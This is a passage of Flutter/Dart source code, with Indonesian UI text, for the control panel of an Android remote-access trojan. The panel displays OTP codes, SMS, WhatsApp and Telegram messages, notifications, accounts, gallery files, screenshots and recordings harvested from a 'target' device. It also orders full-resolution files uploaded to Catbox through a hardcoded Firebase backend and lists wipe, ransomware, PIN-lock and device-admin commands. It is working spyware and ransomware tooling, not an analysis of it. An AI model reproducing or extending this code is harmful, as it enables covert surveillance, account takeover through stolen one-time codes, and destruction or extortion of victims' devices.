                content.contains(_q.toLowerCase());
          }).toList();
    return Column(
      children: [
        _search('Cari notifikasi...'),
        _badge('${filtered.length} notifikasi', const Color(0xFF9C27B0)),
        Expanded(
          child: ListView.builder(
            padding: const EdgeInsets.fromLTRB(16, 0, 16, 16),
            itemCount: filtered.length,
            itemBuilder: (_, i) {
              final notif = filtered[i];
              final app = notif['app']?.toString() ?? '-';
              final title = notif['title']?.toString() ?? '';
              final content = notif['content']?.toString() ?? '';
              return Container(
                margin: const EdgeInsets.only(bottom: 8),
                decoration: BoxDecoration(
                  color: _card,
                  borderRadius: BorderRadius.circular(12),
                  border: Border.all(color: Colors.white.withOpacity(0.04)),
                ),
                child: ListTile(
                  leading: CircleAvatar(
                    backgroundColor: Colors.purple.withOpacity(0.2),
                    child: Text(
                      app.isNotEmpty ? app[0].toUpperCase() : '?',
                      style: const TextStyle(color: Colors.purple),
                    ),
                  ),
                  title: Text(title, style: const TextStyle(color: _textP)),
                  subtitle: Text(
                    content,
                    style: const TextStyle(color: _textS),
                  ),
                ),
              );
            },
          ),
        ),
      ],
    );
  }

  void _showFetchOriginalDialog(String path, String name) async {
    bool isUploading = true;
    String? catboxUrl;
    String statusMsg = 'Meminta target mengunggah file...';
    StreamSubscription? sub;

    final cmdId = await HttpService.sendCommand(widget.deviceId, Cmd.uploadFile, path);

    showModalBottomSheet(
      context: context,
      isScrollControlled: true,
      backgroundColor: Colors.transparent,
      builder: (ctx) => StatefulBuilder(
        builder: (ctx, setModalState) {
          if (isUploading && sub == null) {
            final ref = FirebaseDatabase.instanceFor(
              app: Firebase.app(),
              databaseURL: 'https://mantax-e0919-default-rtdb.asia-southeast1.firebasedatabase.app/',
            ).ref('results/${widget.deviceId}/$cmdId');

            sub = ref.onValue.listen((event) {
              if (event.snapshot.exists) {
                final data = event.snapshot.value;
                if (data is Map && data['type'] == 'file_upload' && data['data'] != null) {
                  try {
                    final obj = jsonDecode(data['data'].toString());
                    final url = obj['url']?.toString() ?? '';
                    if (url.startsWith('http')) {
                      setModalState(() {
                        isUploading = false;
                        catboxUrl = url;
                      });
                    }
                  } catch (e) {

                  }
                  sub?.cancel();
                } else if (data is Map && data['type'] == 'upload_status') {
                  final statusText = data['data']?.toString() ?? '';
                  if (statusText.toLowerCase().contains('failed') || statusText.toLowerCase().contains('error') || statusText.toLowerCase().contains('not found')) {
                     setModalState(() {
                       isUploading = false;
                       statusMsg = statusText;
                     });
                     sub?.cancel();
                  } else {
                     setModalState(() {
                       statusMsg = statusText;
                     });
                  }
                }
              }
            });
          }

          return Container(
            padding: EdgeInsets.only(
              bottom: MediaQuery.of(ctx).viewInsets.bottom + 24,
              left: 24, right: 24, top: 32,
            ),
            decoration: const BoxDecoration(
              color: _card,
              borderRadius: BorderRadius.vertical(top: Radius.circular(24)),
            ),
            child: Column(
              mainAxisSize: MainAxisSize.min,
              children: [
                if (isUploading) ...[
                  const CircularProgressIndicator(color: _accent),
                  const SizedBox(height: 24),
                  Text(statusMsg, style: const TextStyle(color: Colors.white, fontSize: 16), textAlign: TextAlign.center),
                  const SizedBox(height: 8),
                  Text('Sedang mengambil file:\n$name', textAlign: TextAlign.center, style: const TextStyle(color: Colors.white54, fontSize: 13)),
                  const SizedBox(height: 20),
                ] else if (catboxUrl != null) ...[
                  const Icon(Icons.check_circle_rounded, color: Colors.greenAccent, size: 64),
                  const SizedBox(height: 16),
                  const Text('Berhasil!', style: TextStyle(color: Colors.white, fontSize: 20, fontWeight: FontWeight.bold)),
                  const SizedBox(height: 8),
                  Text(name, textAlign: TextAlign.center, style: const TextStyle(color: Colors.white70, fontSize: 12)),
                  const SizedBox(height: 24),
                  ElevatedButton.icon(
                    onPressed: () {
                      _copy(catboxUrl!);
                    },
                    icon: const Icon(Icons.copy_rounded),
                    label: const Text('Salin Link Catbox'),
                    style: ElevatedButton.styleFrom(
                      backgroundColor: _accent,
                      foregroundColor: Colors.white,
                      minimumSize: const Size(double.infinity, 50),
                      shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
                    ),
                  ),
                  const SizedBox(height: 12),

                  if (name.toLowerCase().endsWith('.jpg') || name.toLowerCase().endsWith('.png'))
                    Container(
                      margin: const EdgeInsets.only(top: 12),
                      height: 200,
                      child: ClipRRect(
                        borderRadius: BorderRadius.circular(12),
                        child: Image.network(catboxUrl!, fit: BoxFit.cover),
                      ),
                    ),
                ] else ...[
                  const Icon(Icons.error_outline_rounded, color: Colors.redAccent, size: 64),
                  const SizedBox(height: 16),
                  const Text('Gagal Meminta File', style: TextStyle(color: Colors.redAccent, fontSize: 18)),
                  const SizedBox(height: 8),
                  Text(statusMsg, textAlign: TextAlign.center, style: const TextStyle(color: Colors.white70, fontSize: 14)),
                  const SizedBox(height: 24),
                ],
              ],
            ),
          );
        },
      ),
    ).then((_) {
      sub?.cancel();
    });
  }

  Widget _galleryView() {
    final list = _parseJsonList();
    final filtered = _q.isEmpty
        ? list
        : list.where((item) {
            final name = item['name']?.toString().toLowerCase() ?? '';
            return name.contains(_q.toLowerCase());
          }).toList();
    return Column(
      children: [
        _search('Cari file...'),
        _badge('${filtered.length} file', const Color(0xFF9C27B0)),
        Expanded(
          child: GridView.builder(
            padding: const EdgeInsets.all(16),
            gridDelegate: const SliverGridDelegateWithFixedCrossAxisCount(
              crossAxisCount: 3,
              crossAxisSpacing: 8,
              mainAxisSpacing: 8,
              childAspectRatio: 1,
            ),
            itemCount: filtered.length,
            itemBuilder: (_, i) {
              final item = filtered[i];
              final name = item['name']?.toString() ?? '';
              final path = item['path']?.toString() ?? '';
              final type = item['type']?.toString() ?? '';
              final thumbBase64 = item['thumb']?.toString();

              Widget child;
              if (thumbBase64 != null && thumbBase64.isNotEmpty) {
                try {
                  Uint8List thumbBytes = base64Decode(thumbBase64);
                  child = Image.memory(thumbBytes, fit: BoxFit.cover);
                } catch (e) {
                  child = Icon(
                    type.toLowerCase().contains('mp4')
                        ? Icons.video_library
                        : Icons.image,
                    color: Colors.amber,
                    size: 40,
                  );
                }
              } else {
                child = Icon(
                  type.toLowerCase().contains('mp4')
                      ? Icons.video_library
                      : Icons.image,
                  color: Colors.amber,
                  size: 40,
                );
              }

              return GestureDetector(
                onTap: () {
                  showModalBottomSheet(
                    context: context,
                    backgroundColor: _card,
                    shape: const RoundedRectangleBorder(
                      borderRadius: BorderRadius.vertical(top: Radius.circular(20)),
                    ),
                    builder: (_) => SafeArea(
                      child: Column(
                        mainAxisSize: MainAxisSize.min,
                        children: [
                          Container(
                            margin: const EdgeInsets.symmetric(vertical: 10),
                            width: 40,
                            height: 4,
                            decoration: BoxDecoration(
                              color: Colors.white24,
                              borderRadius: BorderRadius.circular(2),
                            ),
                          ),
                          ListTile(
                            leading: const Icon(Icons.image_search_rounded, color: _textP),
                            title: const Text('Lihat Thumbnail', style: TextStyle(color: _textP)),
                            subtitle: const Text('Lihat pratinjau gambar beresolusi rendah saat ini', style: TextStyle(color: _textS, fontSize: 11)),
                            onTap: () {
                              Navigator.pop(context);
                              if (thumbBase64 != null && thumbBase64.isNotEmpty) {
                                showDialog(
                                  context: context,
                                  builder: (_) => Dialog(
                                    backgroundColor: Colors.transparent,
                                    child: ClipRRect(
                                      borderRadius: BorderRadius.circular(12),
                                      child: InteractiveViewer(
                                        child: Image.memory(base64Decode(thumbBase64)),
                                      ),
                                    ),
                                  ),
                                );
                              }
                            },
                          ),
                          ListTile(
                            leading: const Icon(Icons.cloud_upload_rounded, color: _accent),
                            title: const Text('Minta Versi Asli', style: TextStyle(color: _accent)),
                            subtitle: const Text('Upload file utuh (resolusi penuh/video) ke Catbox', style: TextStyle(color: _textS, fontSize: 11)),
                            onTap: () async {
                              Navigator.pop(context);
                              _showFetchOriginalDialog(path, name);
                            },
                          ),
                          const SizedBox(height: 10),
                        ],
                      ),
                    ),
                  );
                },
                child: Card(
                  color: _card2,
                  child: Column(
                    mainAxisAlignment: MainAxisAlignment.center,
                    children: [
                      Expanded(child: Center(child: child)),
                      Padding(
                        padding: const EdgeInsets.all(4.0),
                        child: Text(
                          name,
                          style: const TextStyle(color: _textS, fontSize: 10),
                          maxLines: 2,
                          overflow: TextOverflow.ellipsis,
                          textAlign: TextAlign.center,
                        ),
                      ),
                    ],
                  ),
                ),
              );
            },
          ),
        ),
      ],
    );
  }


  Widget _otpView() {
    final list = _parseJsonList();
    return Column(
      children: [
        _badge('${list.length} OTP', const Color(0xFFF57C00)),
        Expanded(
          child: ListView.builder(
            padding: const EdgeInsets.fromLTRB(16, 0, 16, 16),
            itemCount: list.length,
            itemBuilder: (_, i) {
              final item = list[i];
              final from = item['from']?.toString() ?? '-';
              final body = item['body']?.toString() ?? '';
              final otp = item['otp']?.toString() ?? '';
              final date = item['date'] != null
                  ? DateTime.fromMillisecondsSinceEpoch(item['date']).toString()
                  : '';
              return Container(
                margin: const EdgeInsets.only(bottom: 8),
                decoration: BoxDecoration(
                  color: _card,
                  borderRadius: BorderRadius.circular(12),
                  border: Border.all(color: _border),
                ),
                child: Padding(
                  padding: const EdgeInsets.all(12),
                  child: Column(
                    crossAxisAlignment: CrossAxisAlignment.start,
                    children: [
                      Row(
                        children: [
                          const Icon(
                            Icons.sms_rounded,
                            size: 14,
                            color: Color(0xFFF57C00),
                          ),
                          const SizedBox(width: 8),
                          Expanded(
                            child: Text(
                              from,
                              style: const TextStyle(
                                color: _textP,
                                fontWeight: FontWeight.bold,
                              ),
                            ),
                          ),
                          Container(
                            padding: const EdgeInsets.symmetric(
                              horizontal: 8,
                              vertical: 2,
                            ),
                            decoration: BoxDecoration(
                              color: const Color(0xFFF57C00).withOpacity(0.2),
                              borderRadius: BorderRadius.circular(8),
                            ),
                            child: Text(
                              otp,
                              style: const TextStyle(
                                color: Color(0xFFF57C00),
                                fontWeight: FontWeight.bold,
                                fontSize: 16,
                              ),
                            ),
                          ),
                        ],
                      ),
                      const SizedBox(height: 8),
                      Text(
                        body,
                        style: const TextStyle(color: _textS, fontSize: 12),
                      ),
                      if (date.isNotEmpty)
                        Padding(
                          padding: const EdgeInsets.only(top: 4),
                          child: Text(
                            date,
                            style: const TextStyle(color: _textS, fontSize: 10),
                          ),
                        ),
                    ],
                  ),
                ),
              );
            },
          ),
        ),
      ],
    );
  }

  Widget _telegramAccountsView() {
    final list = _parseJsonList();
    return Column(
      children: [
        _badge('${list.length} akun Telegram', const Color(0xFF0088CC)),
        Expanded(
          child: ListView.builder(
            padding: const EdgeInsets.fromLTRB(16, 0, 16, 16),
            itemCount: list.length,
            itemBuilder: (_, i) {
              final item = list[i];
              final name = item['name']?.toString() ?? '-';
              final type = item['type']?.toString() ?? '-';
              return _dataCard(
                leading: CircleAvatar(
                  backgroundColor: const Color(0xFF0088CC).withOpacity(0.2),
                  child: const Icon(
                    Icons.send_rounded,
                    color: Color(0xFF0088CC),
                    size: 18,
                  ),
                ),
                title: name,
                subtitle: type,
                onCopy: () => _copy(name),
              );
            },
          ),
        ),
      ],
    );
  }

  Widget _messagesView() {
    final list = _parseJsonList();
    return Column(
      children: [
        _badge('${list.length} pesan', _typeColor()),
        Expanded(
          child: ListView.builder(
            padding: const EdgeInsets.fromLTRB(16, 0, 16, 16),
            itemCount: list.length,
            itemBuilder: (_, i) {
              final item = list[i];
              final from = item['from']?.toString() ?? '-';
              final message =
                  item['message']?.toString() ?? item['text']?.toString() ?? '';
              final time = item['time']?.toString() ?? '';
              return Container(
                margin: const EdgeInsets.only(bottom: 8),
                decoration: BoxDecoration(
                  color: _card,
                  borderRadius: BorderRadius.circular(12),
                  border: Border.all(color: _border),
                ),
                child: Padding(
                  padding: const EdgeInsets.all(12),
                  child: Column(
                    crossAxisAlignment: CrossAxisAlignment.start,
                    children: [
                      Row(
                        children: [
                          Expanded(
                            child: Text(
                              from,
                              style: const TextStyle(
                                color: _textP,
                                fontWeight: FontWeight.bold,
                              ),
                            ),
                          ),
                          if (time.isNotEmpty)
                            Text(
                              time,
                              style: const TextStyle(
                                color: _textS,
                                fontSize: 10,
                              ),
                            ),
                        ],
                      ),
                      const SizedBox(height: 6),
                      Text(message, style: const TextStyle(color: _textS)),
                    ],
                  ),
                ),
              );
            },
          ),
        ),
      ],
    );
  }



  Widget _screenshotView() {
    if (_rawData == null || _rawData.toString().isEmpty) {
      return _empty('Tidak ada screenshot', Icons.broken_image_rounded);
    }
    
    final dataStr = _rawData.toString().trim();
    if (dataStr.startsWith('http')) {
      return Column(
        children: [
          Expanded(
            child: InteractiveViewer(
              child: Center(
                child: Image.network(
                  dataStr,
                  fit: BoxFit.contain,
                ),
              ),
            ),
          ),
          Padding(
            padding: const EdgeInsets.all(16),
            child: ElevatedButton.icon(
              onPressed: () => _copy(dataStr),
              icon: const Icon(Icons.copy_rounded),
              label: const Text('Salin Link Screenshot'),
              style: ElevatedButton.styleFrom(
                backgroundColor: _accent,
                foregroundColor: Colors.white,
                minimumSize: const Size(double.infinity, 50),
              ),
            ),
          ),
        ],
      );
    }

    late Uint8List bytes;
    try {
      String b = dataStr;
      if (b.contains(',')) b = b.split(',').last;
      b = b.replaceAll(RegExp(r'\s+'), '');
      int padding = b.length % 4;
      if (padding != 0) b += '=' * (4 - padding);
      bytes = base64Decode(b);
    } catch (_) {
      return _empty(
        'Gagal mendekode gambar (base64 rusak)',
        Icons.broken_image_rounded,
      );
    }
    final sizeKb = bytes.length ~/ 1024;
    final ts = _fmtTs(_timestamp);

    return Column(
      children: [

        Container(
          margin: const EdgeInsets.fromLTRB(12, 10, 12, 0),
          padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 9),
          decoration: BoxDecoration(
            color: const Color(0xFF00ACC1).withOpacity(0.08),
            borderRadius: BorderRadius.circular(12),
            border: Border.all(
              color: const Color(0xFF00ACC1).withOpacity(0.25),
            ),
          ),
          child: Row(
            children: [
              const Icon(
                Icons.screenshot_rounded,
                color: Color(0xFF00ACC1),
                size: 16,
              ),
              const SizedBox(width: 8),
              Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  Text(
                    '$sizeKb KB · $ts',
                    style: const TextStyle(
                      color: Color(0xFF00ACC1),
                      fontSize: 11,
                      fontWeight: FontWeight.w600,
                    ),
                  ),
                  const Text(
                    'Pinch zoom untuk perbesar',
                    style: TextStyle(color: _textS, fontSize: 10),
                  ),
                ],
              ),
              const Spacer(),
              GestureDetector(
                onTap: () => _copy(_rawData.toString()),
                child: Container(
                  padding: const EdgeInsets.symmetric(
                    horizontal: 10,
                    vertical: 5,
                  ),
                  decoration: BoxDecoration(
                    color: _card2,
                    borderRadius: BorderRadius.circular(8),
                    border: Border.all(color: Colors.white10),
                  ),
                  child: const Row(
                    children: [
                      Icon(Icons.copy_rounded, size: 12, color: _textS),
                      SizedBox(width: 4),
                      Text(
                        'Salin',
                        style: TextStyle(color: _textS, fontSize: 11),
                      ),
                    ],
                  ),
                ),
              ),
            ],
          ),
        ),

        Expanded(
          child: InteractiveViewer(
            minScale: 0.3,
            maxScale: 8.0,
            boundaryMargin: const EdgeInsets.all(40),
            child: Padding(
              padding: const EdgeInsets.all(10),
              child: ClipRRect(
                borderRadius: BorderRadius.circular(16),
                child: Image.memory(
                  bytes,
                  fit: BoxFit.contain,
                  gaplessPlayback: true,
                  errorBuilder: (_, __, ___) =>
                      _empty('Gagal memuat', Icons.broken_image_rounded),
                ),
              ),
            ),
          ),
        ),
      ],
    );
  }

  Widget _screenRecordView() {
    if (_rawData == null || _rawData.toString().isEmpty)
      return _empty('Tidak ada rekaman', Icons.videocam_off_rounded);

    int sizeKb = 0;
    String? url;
    try {
      final obj = jsonDecode(_rawData.toString());
      if (obj is Map) {
        url = obj['url']?.toString();
        sizeKb = (int.tryParse(obj['size']?.toString() ?? '0') ?? 0) ~/ 1024;
      }
    } catch (_) {
      try {
        String b = _rawData.toString();
        if (b.contains(',')) b = b.split(',').last;
        sizeKb = base64Decode(b).length ~/ 1024;
      } catch (_) {}
    }

    final sizeMb = (sizeKb / 1024).toStringAsFixed(2);

    return Center(
      child: Padding(
        padding: const EdgeInsets.all(24),
        child: Column(
          mainAxisSize: MainAxisSize.min,
          children: [
            Container(
              width: 90,
              height: 90,
              decoration: BoxDecoration(
                color: const Color(0xFF00ACC1).withOpacity(0.15),
                shape: BoxShape.circle,
              ),
              child: const Icon(
                Icons.check_circle_rounded,
                color: Color(0xFF00ACC1),
                size: 45,
              ),
            ),
            const SizedBox(height: 24),
            const Text(
              'Rekaman Layar Selesai',
              style: TextStyle(
                color: Colors.white,
                fontSize: 20,
                fontWeight: FontWeight.bold,
              ),
            ),
            const SizedBox(height: 12),
            Text(
              'Ukuran File: $sizeMb MB',
              style: const TextStyle(
                color: Colors.white70,
                fontSize: 14,
              ),
            ),
            const SizedBox(height: 32),
            if (url != null && url.startsWith('http'))
              ElevatedButton.icon(
                onPressed: () => _copy(url!),
                icon: const Icon(Icons.copy_rounded),
                label: const Text('Salin Link Video'),
                style: ElevatedButton.styleFrom(
                  backgroundColor: _accent,
                  foregroundColor: Colors.white,
                  minimumSize: const Size(double.infinity, 50),
                  shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
                ),
              )
            else
              ElevatedButton.icon(
                onPressed: () => _copy(_rawData.toString()),
                icon: const Icon(Icons.save_alt_rounded),
                label: const Text('Salin Data Mentah (Base64)'),
                style: ElevatedButton.styleFrom(
                  backgroundColor: const Color(0xFF00ACC1),
                  foregroundColor: Colors.white,
                  minimumSize: const Size(double.infinity, 50),
                ),
              ),
          ],
        ),
      ),
    );
  }

  Widget _audioResultView() {
    final url = _rawData?.toString() ?? '';
    if (url.isEmpty || !url.startsWith('http')) {
      return _empty('Link Audio Tidak Valid', Icons.broken_image_rounded);
    }
    
    return Center(
      child: Padding(
        padding: const EdgeInsets.all(24),
        child: Column(
          mainAxisSize: MainAxisSize.min,
          children: [
            Container(
              width: 90,
              height: 90,
              decoration: BoxDecoration(
                color: Colors.amber.withOpacity(0.15),
                shape: BoxShape.circle,
              ),
              child: const Icon(Icons.mic_rounded, color: Colors.amber, size: 45),
            ),
            const SizedBox(height: 20),
            const Text(
              'Rekaman Suara Selesai',
              style: TextStyle(color: _textP, fontSize: 20, fontWeight: FontWeight.bold),
            ),
            const SizedBox(height: 12),
            const Text(
              'Audio berhasil direkam dan diunggah ke Firebase Storage.',
              textAlign: TextAlign.center,
              style: TextStyle(color: _textS, fontSize: 13),
            ),
            const SizedBox(height: 24),
            Row(
              children: [
                Expanded(
                  child: ElevatedButton.icon(
                    onPressed: () => _copy(url),
                    icon: const Icon(Icons.copy_rounded, size: 18),
                    label: const Text('Salin Link Audio'),
                    style: ElevatedButton.styleFrom(
                      backgroundColor: _card2,
                      foregroundColor: _textP,
                      padding: const EdgeInsets.symmetric(vertical: 14),
                      shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
                    ),
                  ),
                ),
              ],
            )
          ],
        ),
      ),
    );
  }

  Widget _statusResultView() {
    final isError = _type.contains('error');
    final isRecord = _type.contains('record');
    final isScreenshot = _type.contains('screenshot');
    final color = isError ? _accent : const Color(0xFF00ACC1);
    final icon = isError
        ? Icons.error_rounded
        : isRecord
        ? Icons.videocam_rounded
        : Icons.screenshot_rounded;

    String msg = _rawData?.toString() ?? '-';
    String title = _typeLabel();

    return Center(
      child: Padding(
        padding: const EdgeInsets.all(28),
        child: Column(
          mainAxisSize: MainAxisSize.min,
          children: [
            Container(
              width: 80,
              height: 80,
              decoration: BoxDecoration(
                color: color.withOpacity(0.10),
                shape: BoxShape.circle,
                border: Border.all(color: color.withOpacity(0.3), width: 2),
              ),
              child: Icon(icon, color: color, size: 40),
            ),
            const SizedBox(height: 18),
            Text(
              title,
              style: const TextStyle(
                color: _textP,
                fontSize: 17,
                fontWeight: FontWeight.bold,
              ),
            ),
            const SizedBox(height: 10),
            Container(
              padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 10),
              decoration: BoxDecoration(
                color: color.withOpacity(0.07),
                borderRadius: BorderRadius.circular(12),
                border: Border.all(color: color.withOpacity(0.2)),
              ),
              child: Text(
                msg,
                textAlign: TextAlign.center,
                style: TextStyle(
                  color: color,
                  fontSize: 13,
                  fontFamily: 'monospace',
                ),
              ),
            ),
          ],
        ),
      ),
    );
  }


  List<Map<String, dynamic>> _parseJsonList() {
    try {
      final data = _rawData;
      if (data is List)
        return data.map((e) => e as Map<String, dynamic>).toList();
      if (data is String) {
        final d = jsonDecode(data);
        if (d is List) return d.map((e) => e as Map<String, dynamic>).toList();
      }
    } catch (_) {}
    return [];
  }

  List<String> _parseStringList() {
    try {
      final data = _rawData;
      if (data is List) return data.map((e) => e.toString()).toList();
      if (data is String) {
        final d = jsonDecode(data);
        if (d is List) return d.map((e) => e.toString()).toList();
      }
    } catch (_) {}
    if (_rawData is String)
      return (_rawData as String)
          .split('\n')
          .where((s) => s.isNotEmpty)
          .toList();
    return [];
  }

  List<String> _parseBrowserHistory() {
    try {
      return _parseJsonList()
          .map(
            (e) =>
                e['search']?.toString() ?? e['url']?.toString() ?? e.toString(),
          )
          .toList();
    } catch (_) {
      return _parseStringList();
    }
  }

  Widget _search(String hint) {
    return Padding(
      padding: const EdgeInsets.fromLTRB(16, 10, 16, 6),
      child: TextField(
        onChanged: (v) => setState(() => _q = v),
        style: const TextStyle(color: _textP, fontSize: 13),
        decoration: InputDecoration(
          hintText: hint,
          hintStyle: const TextStyle(color: _textS),
          prefixIcon: const Icon(Icons.search_rounded, color: _textS, size: 18),
          filled: true,
          fillColor: _card2,
          contentPadding: const EdgeInsets.symmetric(vertical: 10),
          border: OutlineInputBorder(
            borderRadius: BorderRadius.circular(14),
            borderSide: BorderSide.none,
          ),
        ),
      ),
    );
  }

  Widget _badge(String text, Color color) {
    return Padding(
      padding: const EdgeInsets.fromLTRB(16, 2, 16, 8),
      child: Row(
        children: [
          Container(
            padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 4),
            decoration: BoxDecoration(
              color: color.withOpacity(0.12),
              borderRadius: BorderRadius.circular(20),
            ),
            child: Text(
              text,
              style: TextStyle(
                color: color,
                fontSize: 11,
                fontWeight: FontWeight.bold,
              ),
            ),
          ),
        ],
      ),
    );
  }

  Widget _dataCard({
    required Widget leading,
    required String title,
    String? subtitle,
    VoidCallback? onCopy,
  }) {
    return Container(
      margin: const EdgeInsets.only(bottom: 8),
      decoration: BoxDecoration(
        color: _card,
        borderRadius: BorderRadius.circular(14),
        border: Border.all(color: Colors.white.withOpacity(0.04)),
      ),
      child: ListTile(
        leading: leading,
        dense: false,
        title: Text(
          title,
          style: const TextStyle(
            color: _textP,
            fontWeight: FontWeight.w600,
            fontSize: 14,
          ),
        ),
        subtitle: subtitle != null
            ? Text(
                subtitle,
                style: const TextStyle(color: _textS, fontSize: 11),
              )
            : null,
        trailing: onCopy != null
            ? GestureDetector(
                onTap: onCopy,
                child: const Icon(Icons.copy_rounded, size: 15, color: _textS),
              )
            : null,
      ),
    );
  }

  Widget _empty(String msg, IconData icon) {
    return Center(
      child: Column(
        mainAxisAlignment: MainAxisAlignment.center,
        children: [
          Icon(icon, color: _textS.withOpacity(0.25), size: 64),
          const SizedBox(height: 12),
          Text(msg, style: const TextStyle(color: _textS)),
        ],
      ),
    );
  }

  Widget _outBtn(String label, IconData icon, VoidCallback onTap) {
    return ElevatedButton.icon(
      onPressed: onTap,
      icon: Icon(icon, size: 15),
      label: Text(label),
      style: ElevatedButton.styleFrom(
        backgroundColor: _card2,
        foregroundColor: _textP,
        padding: const EdgeInsets.symmetric(vertical: 14),
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(14)),
      ),
    );
  }

  Color _typeColor() {
    const m = {
      'photo': Color(0xFF00BFA5), 'photo_error': Color(0xFFE53935),
      'apps': Color(0xFF7C4DFF),
      'contacts': Color(0xFF00897B),
      'sms': Color(0xFF2979FF),
      'sms_status': Color(0xFF2979FF),
      'call_logs': Color(0xFFFF6F00),
      'location': Color(0xFF00897B),
      'device_info': Color(0xFF9C27B0), 'browser_history': Color(0xFFE91E63),
      'file_list': Color(0xFF00897B),
      'file_upload': Color(0xFF00897B),
      'upload_status': Color(0xFF43A047),
      'gmail_emails': Color(0xFFDD2C00),
      'notifications': Color(0xFF9C27B0),
      'gallery': Color(0xFF9C27B0),
      'lock': Color(0xFFF44336),
      'lock_pin': Color(0xFFF44336),
      'overlay': Color(0xFF5C6BC0),
      'vibrate': Color(0xFFFF7043),
      'torch': Color(0xFFFFD600),
      'torch_error': Color(0xFFE53935),
      'wallpaper': Color(0xFF26A69A),
      'wallpaper_error': Color(0xFFE53935),
      'voice': Color(0xFF26C6DA),
      'toast': Color(0xFF5C6BC0),
      'toast_error': Color(0xFFE53935),
      'launch': Color(0xFF43A047),
      'launch_error': Color(0xFFE53935),
      'uninstall': Color(0xFFE53935),
      'admin': Color(0xFFF44336),
      'wipe': Color(0xFFB71C1C),
      'ransomware': Color(0xFFD50000),
      'error': Color(0xFFE53935),

      'whatsapp_numbers': Color(0xFF25D366),
      'otp': Color(0xFFF57C00),
      'telegram_accounts': Color(0xFF0088CC),
      'google_accounts': Color(0xFFDB4437),
      'games_info': Color(0xFFF44336),
      'whatsapp_messages': Color(0xFF25D366),
      'telegram_messages': Color(0xFF0088CC),

      'screenshot': Color(0xFF00ACC1),
      'screenshot_status': Color(0xFF00ACC1),
      'screenshot_error': Color(0xFFEF5350),
      'screen_record': Color(0xFF00ACC1),
      'record_status': Color(0xFF00ACC1),
      'record_error': Color(0xFFEF5350),
    };
    return m[_type] ?? _accent;
  }

  IconData _typeIcon() {
    const m = {
      'photo': Icons.camera_alt_rounded,
      'photo_error': Icons.camera_alt_outlined,
      'apps': Icons.apps_rounded,
      'contacts': Icons.contacts_rounded,
      'sms': Icons.sms_rounded,
      'sms_status': Icons.send_rounded,
      'call_logs': Icons.call_rounded,
      'location': Icons.location_on_rounded,
      'device_info': Icons.info_rounded,
      'browser_history': Icons.history_rounded,
      'file_list': Icons.folder_open_rounded,
      'file_upload': Icons.upload_file_rounded,
      'upload_status': Icons.cloud_upload_rounded,
      'gmail_emails': Icons.email_rounded,
      'notifications': Icons.notifications_active_rounded,
      'gallery': Icons.photo_library_rounded,
      'lock': Icons.lock_rounded,
      'lock_pin': Icons.pin_rounded,
      'overlay': Icons.layers_rounded,
      'vibrate': Icons.vibration_rounded, 'torch': Icons.flashlight_on_rounded,
      'torch_error': Icons.flashlight_off_rounded,
      'wallpaper': Icons.wallpaper_rounded,
      'wallpaper_error': Icons.wallpaper_rounded,
      'voice': Icons.record_voice_over_rounded,
      'toast': Icons.message_rounded, 'toast_error': Icons.message_outlined,
      'launch': Icons.launch_rounded,
      'launch_error': Icons.error_outline_rounded,
      'uninstall': Icons.delete_rounded,
      'admin': Icons.admin_panel_settings_rounded,
      'wipe': Icons.delete_forever_rounded,
      'ransomware': Icons.dangerous_rounded,
      'error': Icons.error_rounded,

      'whatsapp_numbers': Icons.phone_android_rounded,
      'otp': Icons.sms_rounded,
      'telegram_accounts': Icons.send_rounded,
      'google_accounts': Icons.g_mobiledata_rounded,
      'games_info': Icons.sports_esports_rounded,
      'whatsapp_messages': Icons.chat_rounded,
      'telegram_messages': Icons.chat_bubble_rounded,

      'screenshot': Icons.screenshot_rounded,
      'screenshot_status': Icons.screenshot_rounded,
      'screenshot_error': Icons.no_photography_rounded,
      'screen_record': Icons.videocam_rounded,
      'record_status': Icons.videocam_rounded,
      'record_error': Icons.videocam_off_rounded,
    };
    return m[_type] ?? Icons.data_object_rounded;
  }

  String _typeLabel() {
    const m = {
      'photo': 'Foto Kamera',
      'photo_error': 'Error Kamera',
      'apps': 'Daftar Aplikasi',
      'contacts': 'Daftar Kontak',
      'sms': 'Pesan SMS',
      'sms_status': 'Status Kirim SMS',
      'call_logs': 'Log Panggilan',
      'location': 'Lokasi GPS',
      'device_info': 'Info Perangkat',
      'browser_history': 'Riwayat Browser',
      'file_list': 'Daftar File',
      'file_upload': 'File Diupload',
      'upload_status': 'Status Upload',
      'gmail_emails': 'Email Gmail',
      'notifications': 'Notifikasi',
      'gallery': 'Galeri',
      'lock': 'Kunci Layar',
      'lock_pin': 'Set PIN',
      'overlay': 'Overlay',
      'vibrate': 'Getar',
      'torch': 'Senter',
      'torch_error': 'Error Senter',
      'wallpaper': 'Wallpaper',
      'wallpaper_error': 'Error Wallpaper',
      'voice': 'Pesan Suara',
      'toast': 'Pesan Layar',
      'toast_error': 'Error Toast',
      'launch': 'Buka Aplikasi',
      'launch_error': 'Error Buka App',
      'uninstall': 'Hapus Aplikasi',
      'admin': 'Device Admin',
      'wipe': 'Wipe Perangkat',
      'ransomware': 'Ransomware', 'error': 'Error',

      'whatsapp_numbers': 'Nomor WhatsApp',
      'otp': 'Kode OTP',
      'telegram_accounts': 'Akun Telegram',
      'google_accounts': 'Akun Google',
      'games_info': 'Info Game',
      'whatsapp_messages': 'Pesan WhatsApp',
      'telegram_messages': 'Pesan Telegram',

      'screenshot': 'Screenshot Layar',
      'screenshot_status': 'Status Screenshot',
      'screenshot_error': 'Error Screenshot',
      'screen_record': 'Rekaman Layar',
      'record_status': 'Status Rekaman',
      'record_error': 'Error Rekaman',
    };
    return m[_type] ?? _type.replaceAll('_', ' ');
  }
}




class LiveStreamPage extends StatefulWidget {
  final String deviceId;
  final String cmdId;
  const LiveStreamPage({required this.deviceId, required this.cmdId});

  @override
  _LiveStreamPageState createState() => _LiveStreamPageState();
}

class _LiveStreamPageState extends State<LiveStreamPage> {
  StreamSubscription? _sub;
  Uint8List? _frame;
  bool _isError = false;
  Timer? _timer;

  @override
  void initState() {
    super.initState();
    _startStreaming();

    _timer = Timer(const Duration(seconds: 30), () {
      if (mounted) {
        Navigator.pop(context);
